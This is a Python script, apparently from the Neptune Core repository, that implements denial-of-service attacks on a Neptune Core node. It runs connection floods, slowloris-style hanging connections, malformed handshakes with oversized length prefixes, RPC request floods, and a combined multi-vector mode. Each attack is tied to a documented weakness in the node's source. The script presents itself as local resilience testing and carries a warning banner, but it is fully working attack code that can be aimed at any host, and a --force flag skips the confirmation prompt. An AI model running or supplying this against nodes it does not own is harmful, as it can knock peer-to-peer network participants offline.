#!/usr/bin/env python3
"""
Neptune Core DDoS Testing Script

This script tests the DDoS resilience of a Neptune Core node by simulating
various attack vectors identified in the connection flow analysis.

⚠️  WARNING: This script is for TESTING PURPOSES ONLY on your local node.
    DO NOT use this against production nodes or nodes you don't own.
    Unauthorized DDoS attacks are illegal.

Usage:
    python3 scripts/python/ddos.py --target localhost --port 9798 --attack connection-flood
    python3 scripts/python/ddos.py --target localhost --port 9798 --attack slowloris
    python3 scripts/python/ddos.py --target localhost --port 9798 --attack rpc-flood

Based on vulnerabilities documented in:
    docs/adhoc/connection-flow-analysis.md
"""

import argparse
import asyncio
import socket
import struct
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from typing import List, Optional
import random
import logging

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class DDoSAttack:
    """Base class for DDoS attack simulations"""

    def __init__(self, target: str, port: int, duration: int = 60):
        self.target = target
        self.port = port
        self.duration = duration
        self.start_time = None
        self.stats = {
            'connections_attempted': 0,
            'connections_succeeded': 0,
            'connections_failed': 0,
            'bytes_sent': 0,
            'errors': []
        }

    def is_running(self) -> bool:
        """Check if attack duration has expired"""
        if self.start_time is None:
            return True
        return (time.time() - self.start_time) < self.duration

    def print_stats(self):
        """Print attack statistics"""
        logger.info("=" * 60)
        logger.info("Attack Statistics:")
        logger.info(f"  Duration: {time.time() - self.start_time:.2f}s")
        logger.info(f"  Connections Attempted: {self.stats['connections_attempted']}")
        logger.info(f"  Connections Succeeded: {self.stats['connections_succeeded']}")
        logger.info(f"  Connections Failed: {self.stats['connections_failed']}")
        logger.info(f"  Bytes Sent: {self.stats['bytes_sent']}")
        logger.info(f"  Success Rate: {self.stats['connections_succeeded'] / max(1, self.stats['connections_attempted']) * 100:.2f}%")
        if self.stats['errors']:
            logger.info(f"  Unique Errors: {len(set(self.stats['errors']))}")
        logger.info("=" * 60)


class ConnectionFloodAttack(DDoSAttack):
    """
    Simulates rapid connection attempts to exhaust connection slots.

    Exploits vulnerability: Unlimited Connection Spawning (High Priority #1)
    Location: main_loop.rs:1698-1723

    Each connection spawns a tokio task with no limits, causing:
    - Memory exhaustion
    - CPU saturation
    - Resource starvation
    """

    def __init__(self, target: str, port: int, duration: int = 60,
                 connections_per_second: int = 100, max_workers: int = 50):
        super().__init__(target, port, duration)
        self.connections_per_second = connections_per_second
        self.max_workers = max_workers

    def create_connection(self, connection_id: int) -> bool:
        """Attempt to create a single connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.port))
            self.stats['connections_succeeded'] += 1

            # Keep connection alive to exhaust resources
            time.sleep(0.1)
            sock.close()
            return True

        except ConnectionRefusedError:
            self.stats['errors'].append('ConnectionRefused')
            return False
        except socket.timeout:
            self.stats['errors'].append('Timeout')
            return False
        except Exception as e:
            self.stats['errors'].append(str(type(e).__name__))
            return False
        finally:
            self.stats['connections_attempted'] += 1

    def run(self):
        """Execute connection flood attack"""
        logger.info(f"Starting Connection Flood Attack on {self.target}:{self.port}")
        logger.info(f"Target: {self.connections_per_second} connections/sec for {self.duration}s")
        logger.info(f"Workers: {self.max_workers}")

        self.start_time = time.time()
        connection_id = 0

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            while self.is_running():
                batch_start = time.time()

                # Submit batch of connections
                futures = []
                for _ in range(self.connections_per_second):
                    if not self.is_running():
                        break
                    futures.append(executor.submit(self.create_connection, connection_id))
                    connection_id += 1

                # Wait for batch to complete or 1 second, whichever comes first
                batch_duration = time.time() - batch_start
                if batch_duration < 1.0:
                    time.sleep(1.0 - batch_duration)

                # Log progress every 10 seconds
                if int(time.time() - self.start_time) % 10 == 0:
                    logger.info(f"Progress: {self.stats['connections_attempted']} attempts, "
                              f"{self.stats['connections_succeeded']} succeeded")

        self.print_stats()


class SlowlorisAttack(DDoSAttack):
    """
    Simulates slowloris-style attack with partial handshakes.

    Exploits vulnerability: No Connection Timeout Protection (High Priority #4)
    Location: Handshake process (connect_to_peers.rs:284-377)

    Opens connections but never completes handshake, causing:
    - Resource exhaustion from incomplete handshakes
    - Connection slot exhaustion
    - Memory leaks from hanging connections
    """

    def __init__(self, target: str, port: int, duration: int = 60,
                 num_connections: int = 200):
        super().__init__(target, port, duration)
        self.num_connections = num_connections
        self.active_sockets: List[socket.socket] = []

    async def create_slow_connection(self, connection_id: int):
        """Create a connection and keep it hanging"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setblocking(False)

            # Attempt connection
            try:
                sock.connect((self.target, self.port))
            except BlockingIOError:
                pass  # Expected for non-blocking socket

            # Wait for connection to establish
            await asyncio.sleep(0.5)

            self.active_sockets.append(sock)
            self.stats['connections_succeeded'] += 1

            # Send partial handshake data slowly
            # Neptune expects a length-delimited frame with bincode-encoded PeerMessage
            # We'll send partial frame header to keep connection alive
            partial_data = b'\x00\x00\x00'  # Incomplete length prefix

            try:
                sock.send(partial_data)
                self.stats['bytes_sent'] += len(partial_data)
            except:
                pass

            return True

        except Exception as e:
            self.stats['errors'].append(str(type(e).__name__))
            return False
        finally:
            self.stats['connections_attempted'] += 1

    async def keep_alive_loop(self):
        """Periodically send data to keep connections alive"""
        while self.is_running():
            for sock in self.active_sockets[:]:
                try:
                    # Send one byte to keep connection alive
                    sock.send(b'\x00')
                    self.stats['bytes_sent'] += 1
                except:
                    # Remove dead connections
                    self.active_sockets.remove(sock)

            await asyncio.sleep(10)

    async def run_async(self):
        """Execute slowloris attack"""
        logger.info(f"Starting Slowloris Attack on {self.target}:{self.port}")
        logger.info(f"Target: {self.num_connections} hanging connections for {self.duration}s")

        self.start_time = time.time()

        # Create initial batch of connections
        tasks = []
        for i in range(self.num_connections):
            tasks.append(self.create_slow_connection(i))

        await asyncio.gather(*tasks)

        logger.info(f"Established {len(self.active_sockets)} hanging connections")

        # Keep connections alive
        await self.keep_alive_loop()

        # Cleanup
        for sock in self.active_sockets:
            try:
                sock.close()
            except:
                pass

        self.print_stats()

    def run(self):
        """Synchronous wrapper for async run"""
        asyncio.run(self.run_async())


class MalformedHandshakeAttack(DDoSAttack):
    """
    Sends malformed handshakes to trigger error handling overhead.

    Exploits vulnerability: Resource-Intensive Handshake (Medium Priority #6)
    Location: answer_peer_inner function

    Sends invalid handshake data to cause:
    - Error allocation overhead
    - CPU usage from error handling
    - Memory pressure from error objects
    """

    def __init__(self, target: str, port: int, duration: int = 60,
                 requests_per_second: int = 50):
        super().__init__(target, port, duration)
        self.requests_per_second = requests_per_second

    def send_malformed_handshake(self, connection_id: int) -> bool:
        """Send malformed handshake data"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.port))
            self.stats['connections_succeeded'] += 1

            # Generate various types of malformed data
            malformed_types = [
                b'\x00' * 100,  # Null bytes
                b'\xff' * 100,  # Max bytes
                b'MALFORMED',   # Random text
                struct.pack('<I', 999999999) + b'\x00' * 100,  # Huge length prefix
                b'\x00\x00\x00\x01' + b'X',  # Valid length, invalid bincode
            ]

            malformed_data = random.choice(malformed_types)
            sock.send(malformed_data)
            self.stats['bytes_sent'] += len(malformed_data)

            # Try to read response (will likely fail)
            try:
                sock.recv(1024)
            except:
                pass

            sock.close()
            return True

        except Exception as e:
            self.stats['errors'].append(str(type(e).__name__))
            return False
        finally:
            self.stats['connections_attempted'] += 1

    def run(self):
        """Execute malformed handshake attack"""
        logger.info(f"Starting Malformed Handshake Attack on {self.target}:{self.port}")
        logger.info(f"Target: {self.requests_per_second} malformed handshakes/sec for {self.duration}s")

        self.start_time = time.time()
        connection_id = 0

        with ThreadPoolExecutor(max_workers=20) as executor:
            while self.is_running():
                batch_start = time.time()

                # Submit batch of malformed handshakes
                futures = []
                for _ in range(self.requests_per_second):
                    if not self.is_running():
                        break
                    futures.append(executor.submit(self.send_malformed_handshake, connection_id))
                    connection_id += 1

                # Rate limiting
                batch_duration = time.time() - batch_start
                if batch_duration < 1.0:
                    time.sleep(1.0 - batch_duration)

                # Log progress
                if int(time.time() - self.start_time) % 10 == 0:
                    logger.info(f"Progress: {self.stats['connections_attempted']} attempts")

        self.print_stats()


class RPCFloodAttack(DDoSAttack):
    """
    Floods RPC server with requests.

    Exploits vulnerability: RPC Server Vulnerabilities (High Priority #5)
    Location: neptune-core-cli/src/rpc/server.rs

    RPC server has:
    - No connection limits
    - No rate limiting
    - No timeout protection
    """

    def __init__(self, target: str, port: int = 9799, duration: int = 60,
                 requests_per_second: int = 100):
        super().__init__(target, port, duration)
        self.requests_per_second = requests_per_second

    def send_rpc_request(self, request_id: int) -> bool:
        """Send RPC request"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.port))

            # Craft JSON-RPC request
            json_request = f'''{{
                "jsonrpc": "2.0",
                "method": "block_height",
                "params": {{}},
                "id": {request_id}
            }}'''

            # Craft HTTP request
            http_request = f"POST / HTTP/1.1\r\n"
            http_request += f"Host: {self.target}:{self.port}\r\n"
            http_request += "Content-Type: application/json\r\n"
            http_request += f"Content-Length: {len(json_request)}\r\n"
            http_request += "\r\n"
            http_request += json_request

            sock.send(http_request.encode())
            self.stats['bytes_sent'] += len(http_request)
            self.stats['connections_succeeded'] += 1

            # Read response
            try:
                sock.recv(8192)
            except:
                pass

            sock.close()
            return True

        except Exception as e:
            self.stats['errors'].append(str(type(e).__name__))
            return False
        finally:
            self.stats['connections_attempted'] += 1

    def run(self):
        """Execute RPC flood attack"""
        logger.info(f"Starting RPC Flood Attack on {self.target}:{self.port}")
        logger.info(f"Target: {self.requests_per_second} requests/sec for {self.duration}s")

        self.start_time = time.time()
        request_id = 0

        with ThreadPoolExecutor(max_workers=50) as executor:
            while self.is_running():
                batch_start = time.time()

                # Submit batch of RPC requests
                futures = []
                for _ in range(self.requests_per_second):
                    if not self.is_running():
                        break
                    futures.append(executor.submit(self.send_rpc_request, request_id))
                    request_id += 1

                # Rate limiting
                batch_duration = time.time() - batch_start
                if batch_duration < 1.0:
                    time.sleep(1.0 - batch_duration)

                # Log progress
                if int(time.time() - self.start_time) % 10 == 0:
                    logger.info(f"Progress: {self.stats['connections_attempted']} requests")

        self.print_stats()


class MultiVectorAttack(DDoSAttack):
    """
    Combines multiple attack vectors simultaneously.

    Tests resilience against coordinated attacks combining:
    - Connection flooding
    - Slowloris
    - Malformed handshakes
    """

    def __init__(self, target: str, port: int, duration: int = 60):
        super().__init__(target, port, duration)

    def run(self):
        """Execute multi-vector attack"""
        logger.info(f"Starting Multi-Vector Attack on {self.target}:{self.port}")
        logger.info(f"Duration: {self.duration}s")
        logger.info("Vectors: Connection Flood + Slowloris + Malformed Handshakes")

        self.start_time = time.time()

        # Launch attacks in parallel threads
        attacks = [
            ConnectionFloodAttack(self.target, self.port, self.duration,
                                connections_per_second=50, max_workers=25),
            SlowlorisAttack(self.target, self.port, self.duration,
                          num_connections=100),
            MalformedHandshakeAttack(self.target, self.port, self.duration,
                                   requests_per_second=25),
        ]

        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(attack.run) for attack in attacks]

            # Wait for all attacks to complete
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Attack failed: {e}")

        # Aggregate stats
        for attack in attacks:
            for key in self.stats:
                if isinstance(self.stats[key], int):
                    self.stats[key] += attack.stats.get(key, 0)
                elif isinstance(self.stats[key], list):
                    self.stats[key].extend(attack.stats.get(key, []))

        self.print_stats()


def main():
    parser = argparse.ArgumentParser(
        description='Neptune Core DDoS Testing Script',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )

    parser.add_argument('--target', default='localhost',
                       help='Target host (default: localhost)')
    parser.add_argument('--port', type=int, default=9798,
                       help='Target port (default: 9798 for P2P)')
    parser.add_argument('--duration', type=int, default=60,
                       help='Attack duration in seconds (default: 60)')
    parser.add_argument('--attack', required=True,
                       choices=['connection-flood', 'slowloris', 'malformed-handshake',
                               'rpc-flood', 'multi-vector'],
                       help='Attack type to execute')
    parser.add_argument('--rate', type=int, default=100,
                       help='Requests/connections per second (default: 100)')
    parser.add_argument('--workers', type=int, default=50,
                       help='Number of worker threads (default: 50)')
    parser.add_argument('--force', action='store_true',
                       help='Skip confirmation prompt (use with caution)')

    args = parser.parse_args()

    # Warning banner
    logger.warning("=" * 60)
    logger.warning("⚠️  DDoS TESTING SCRIPT")
    logger.warning("=" * 60)
    logger.warning("This script will stress test the target node.")
    logger.warning(f"Target: {args.target}:{args.port}")
    logger.warning(f"Attack: {args.attack}")
    logger.warning(f"Duration: {args.duration}s")
    logger.warning("")
    logger.warning("Make sure you own this node and have permission to test it.")
    logger.warning("=" * 60)

    # Confirmation
    if not args.force:
        try:
            response = input("\nContinue? (yes/no): ")
            if response.lower() != 'yes':
                logger.info("Attack cancelled.")
                sys.exit(0)
        except KeyboardInterrupt:
            logger.info("\nAttack cancelled.")
            sys.exit(0)
        except EOFError:
            logger.error("No input available. Use --force to skip confirmation.")
            sys.exit(1)
    else:
        logger.info("Skipping confirmation (--force enabled)")
        logger.info("")

    # Execute attack
    try:
        if args.attack == 'connection-flood':
            attack = ConnectionFloodAttack(args.target, args.port, args.duration,
                                          connections_per_second=args.rate,
                                          max_workers=args.workers)
        elif args.attack == 'slowloris':
            attack = SlowlorisAttack(args.target, args.port, args.duration,
                                   num_connections=args.rate)
        elif args.attack == 'malformed-handshake':
            attack = MalformedHandshakeAttack(args.target, args.port, args.duration,
                                            requests_per_second=args.rate)
        elif args.attack == 'rpc-flood':
            attack = RPCFloodAttack(args.target, args.port, args.duration,
                                  requests_per_second=args.rate)
        elif args.attack == 'multi-vector':
            attack = MultiVectorAttack(args.target, args.port, args.duration)

        attack.run()

    except KeyboardInterrupt:
        logger.info("\nAttack interrupted by user.")
        if 'attack' in locals():
            attack.print_stats()
    except Exception as e:
        logger.error(f"Attack failed: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()

